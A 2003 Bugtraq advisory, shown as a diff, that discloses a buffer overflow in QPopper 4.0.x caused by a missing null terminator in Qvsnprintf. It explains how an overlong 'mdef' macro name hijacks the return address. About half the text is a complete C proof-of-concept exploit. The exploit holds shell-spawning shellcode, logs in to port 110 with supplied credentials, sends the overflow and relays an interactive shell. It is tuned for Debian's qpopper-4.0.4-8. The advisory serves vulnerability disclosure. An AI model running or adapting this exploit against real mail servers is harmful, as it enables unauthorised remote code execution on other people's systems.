@@ -1,0 +1,138 @@
+
+Date: Mon, 10 Mar 2003 15:31:34 +0100
+From: Florian Heinz <heinz@...non-ag.de>
+To: bugtraq@...urityfocus.com
+Subject: QPopper 4.0.x buffer overflow vulnerability
+
+
+Hello,
+
+Under certain conditions it is possible to execute arbitrary code using
+a buffer overflow in the recent qpopper.
+
+You need a valid username/password-combination and code is (depending on
+the setup) usually executed with the user's uid and gid mail.
+
+Explanation:
+
+Qualcomm provides their own vsnprintf-implementation Qvsnprintf(). This
+function is used unconditionally on any system, regardless if the system
+has its own vsnprintf().
+The function correctly writes up to 'n' bytes into the buffer, but fails
+to null-terminate it, if buffer-space runs out while copying the
+format-string (so the obvious fix is, null-terminate the buffer in
+Qvsnprintf()).
+This is a problem in pop_msg() (popper/pop_msg.c).
+The call to Qvsnprintf() can leave the buffer 'message' unterminated, so
+the successive call to strcat (strcat(message,"\r\n")) writes somewhere
+into thew stack. What it exactly overwrites depends heavily on the
+individual binary and the current stack-data (where is the next
+null-byte).
+I successfully managed to execute arbitrary code using the
+'mdef'-command with the binary in the most recent debian-package
+'qpopper-4.0.4-8'
+Sending 'mdef <macroname>()' with a macro-name of about 1000 bytes
+fills the buffer leaving it unterminated. The strcat overwrites the
+least significant byte of the saved basepointer on the stack,
+now pointing inside the buffer. On return of pop_mdef() (file
+pop_extend.c), the return-address is now fetched from within our buffer
+(and of course pointing inside our buffer), allowing to, for example,
+spawn a shell.
+The Macroname may not include bytes causing isspace() to return true
+and, of course, no null-byte, so shellcode must be appropriate crafted.
+I have tested the qpopper from SuSE 8.1 too, the flaw exists too, but
+SuSE is more lucky, strcat doesn't overwrite critical values. I have
+not yet tested other distributions.
+
+Here is a POC-exploit, Values for RETADDR and BUFSIZE adjusted for
+debian qpopper-4.0.4-8:
+
+-- snip --
+
+
+#include <sys/socket.h>
+#include <sys/select.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+char *sc = "\x31\xc0\x31\xdb\xb0\x17\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68"
+           "\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x08\x40"
+           "\x40\x40\xcd\x80";           
+
+#define BUFLEN 1006
+#define RETLEN 148
+#define RETADDR 0xbfffd304
+
+int main (int argc, char **argv) {
+   int fd, len, i, retaddr = RETADDR;
+   char *bp, buf[2000];
+   struct sockaddr_in peer;
+   fd_set fs;
+
+   if (argc != 4) {
+      fprintf(stderr, "Usage: %s <ip> <user> <pass>\n\n", argv[0]);
+      exit(EXIT_FAILURE);
+   }
+   
+   peer.sin_family = AF_INET;
+   peer.sin_port = htons(110);
+   peer.sin_addr.s_addr = inet_addr(argv[1]);
+   fd = socket(AF_INET, SOCK_STREAM, 0);
+   if (connect(fd, (struct sockaddr *)&peer, sizeof(struct sockaddr_in)) < 0) {
+      perror("connect");
+      exit(EXIT_FAILURE);
+   }
+   snprintf(buf, 1024, "USER %s\n", argv[2]);
+   write(fd, buf, strlen(buf));
+   snprintf(buf, 1024, "PASS %s\n", argv[3]);
+   write(fd, buf, strlen(buf));
+   memset(buf, 0x90, 2000);
+   memcpy(buf, "mdef ", 5);
+   memcpy(buf + BUFLEN - RETLEN - strlen(sc), sc, strlen(sc));
+   bp = (char *) (((unsigned int)(buf + BUFLEN - RETLEN)) & 0xfffffffc);
+   for (i = 0; i < RETLEN; i += 4)
+     memcpy(bp+i+2, &retaddr, sizeof(int));
+   buf[BUFLEN-2] = '(';
+   buf[BUFLEN-1] = ')';
+   buf[BUFLEN] = '\n';
+   write(fd, buf, BUFLEN+1);
+   while (1) {
+      FD_ZERO(&fs);
+      FD_SET(0, &fs);
+      FD_SET(fd, &fs);
+      select(fd+1, &fs, NULL, NULL, NULL);
+      if (FD_ISSET(0, &fs)) {
+	 if ((len = read(0, buf, 1000)) <= 0)
+	   break;
+	 write(fd, buf, len);
+      } else {
+	 if ((len = read(fd, buf, 1000)) <= 0)
+	   break;
+	 write(1, buf, len);
+      }
+   }
+   
+   exit(EXIT_SUCCESS);
+}
+
+-- snap --
+
+This is the short version. An enhanced version with error-checking,
+bufsize- and return-address autodetection can be found on
+http://nstx.dereference.de/snippets/qex.c
+
+Feedback is welcome.
+
+regards,
+
+Florian Heinz
+Cronon AG
+http://www.cronon.org
+
+PS: sorry for the bad english ;)
+
+
